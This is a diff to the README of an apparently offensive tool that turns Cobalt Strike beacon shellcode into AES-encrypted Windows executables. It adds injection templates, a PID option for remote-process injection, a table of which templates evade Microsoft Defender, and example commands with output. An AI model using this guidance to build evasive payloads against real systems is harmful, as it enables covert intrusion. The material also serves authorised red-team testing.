@@ -50,38 +50,51 @@ Generate a Cobalt Strike payload:
     -h            Print this help menu
     -p            PID
 
-    Templates:                                     Last update: 06/02/21
-    +-----------------------------------------------+------------------+
-    | Techniques                                    | Bypass Defender  |
-    +-----------------------------------------------+------------------+
-    | win32_VirtualProtect.tmpl                     |        No        |
-    +-----------------------------------------------+------------------+
-    | win64_CreateFiber.tmpl                        |        No        |
-    +-----------------------------------------------+------------------+
-    | win64_CreateRemoteThreadNative.tmpl           |        Yes       | 
-    +-----------------------------------------------+------------------+
-    | win64_CreateThread.tmpl                       |        No        | 
-    +-----------------------------------------------+------------------+
-    | win64_EtwpCreateEtwThread.tmpl                |        No        | 
-    +-----------------------------------------------+------------------+
-    | win64_Syscall.tmpl                            |        No        | 
-    +-----------------------------------------------+------------------+
-    | win64_CreateThreadpoolWait.tmpl               |        No        | 
-    +-----------------------------------------------+------------------+
-    | win64_EnumerateLoadedModules.tmpl             |        No        | 
-    +-----------------------------------------------+------------------+
-    | win64_EnumChildWindows.tmpl                   |        No        | 
-    +-----------------------------------------------+------------------+
+    Templates:                                        Last update: 06/07/21
+    +--------------------------------------+-----------+------------------+
+    | Techniques                           | PID       | Bypass Defender  |
+    +--------------------------------------+-----------+------------------+
+    | win32_VirtualProtect.tmpl            |           |        No        |
+    +--------------------------------------+-----------+------------------+
+    | win64_CreateFiber.tmpl               |           |        No        |
+    +--------------------------------------+-----------+------------------+
+    | win64_CreateRemoteThreadNative.tmpl  | Required  |        Yes       | 
+    +--------------------------------------+-----------+------------------+
+    | win64_CreateThread.tmpl              |           |        No        | 
+    +--------------------------------------+-----------+------------------+
+    | win64_EtwpCreateEtwThread.tmpl       |           |        No        | 
+    +--------------------------------------+-----------+------------------+
+    | win64_Syscall.tmpl                   |           |        No        | 
+    +--------------------------------------+-----------+------------------+
+    | win64_CreateThreadpoolWait.tmpl      |           |        No        | 
+    +--------------------------------------+-----------+------------------+
+    | win64_EnumerateLoadedModules.tmpl    |           |        No        | 
+    +--------------------------------------+-----------+------------------+
+    | win64_EnumChildWindows.tmpl          |           |        No        | 
+    +--------------------------------------+-----------+------------------+
+    | win64_CreateRemoteThread.tmpl        | Required  |        No        | 
+    +--------------------------------------+-----------+------------------+
+    | win64_RtlCreateUserThread.tmpl       | Required  |        No        | 
+    +--------------------------------------+-----------+------------------+
+    | win64_CreateThreadNative.tmpl        |           |        No        | 
+    +--------------------------------------+-----------+------------------+
 
     Example:
 
     ./bankai -i beacon.bin -o payload.exe -t win64_CreateThread.tmpl -a 64
-
     [INFO] Key: SymE9GQBtyHL4IAq5Pm6r3b8I7PJB9l0
     [INFO] AES encrpyting the payload...
     [INFO] Arch: x64 (64-bit)
     [INFO] Template: win64_CreateThread.tmpl
     [INFO] InputFile: beacon.bin
+    [INFO] OutputFile: payload.exe
+
+    ./bankai -i beacon64.bin -o payload.exe -t win64_CreateRemoteThread.tmpl -a 64 -p 7720
+    [INFO] Key: 3mOL2Ne5XIW4xCieiR7cPmHtw4o737Do
+    [INFO] AES encrpyting the payload...
+    [INFO] Arch: x64 (64-bit)
+    [INFO] Template: win64_CreateRemoteThread.tmpl
+    [INFO] InputFile: beacon64.bin
     [INFO] OutputFile: payload.exe
 ```
 
@@ -95,6 +108,7 @@ All of the work is inspired and done by the following researchers/projects:
 ## Todo
 * Add more shellcode injection technique templates
 * Add [AlternativeShellcodeExec](https://github.com/S4R1N/AlternativeShellcodeExec) techniques that Ali and Alfaro found
+* Test these shellcodes with modified malleableC2 profiles 
 
 ### Change Log
 ##### 06/02/21
@@ -103,5 +117,9 @@ All of the work is inspired and done by the following researchers/projects:
 * Added `win64_EnumChildWindows.tmpl`
 * Updated some error handling
 
-
+##### 06/07/21
+* Added `win64_EnumPageFilesW.tmpl`
+* Added `win64_CreateRemoteThread.tmpl`
+* Added `win64_RtlCreateUserThread.tmpl`
+* Added `win64_CreateThreadNative.tmpl`
 
